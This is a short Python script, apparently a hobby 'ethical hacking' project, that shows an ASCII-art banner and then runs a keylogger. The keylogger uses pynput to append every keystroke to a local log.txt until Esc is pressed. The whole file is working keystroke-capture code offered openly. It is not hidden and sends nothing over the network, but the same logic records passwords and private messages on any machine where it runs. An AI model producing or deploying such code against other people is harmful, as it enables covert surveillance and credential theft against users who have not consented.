from pynput.keyboard import Key, Listener
import pyfiglet
import colorama
from colorama import Fore

# Initialize colorama for colored output
colorama.init(autoreset=True)

def display_name():
    """
    Display the name "WiZeySenitl" using figlet.
    """
    # Generating  ASCII art of "WiZeySenitl" using the figlet library
    
    path1 = "figlet-fonts/Graffiti"
    path2 = "figlet-fonts/wideterm"

    ascii_art1 = pyfiglet.figlet_format("WiZeySenitl", font=path1,justify="center")
    ascii_art2 = pyfiglet.figlet_format("Ethical WiZzzrd", font=path2, justify="center")

    # Printing the ASCII art in blue color for better visibility
    print(Fore.YELLOW + ascii_art1)
    print(ascii_art2)

# Function to write the pressed key into a file
def on_press(key):
    with open("log.txt", "a") as f:
        f.write(str(key) + "\n")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Start listening for key presses
display_name()
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

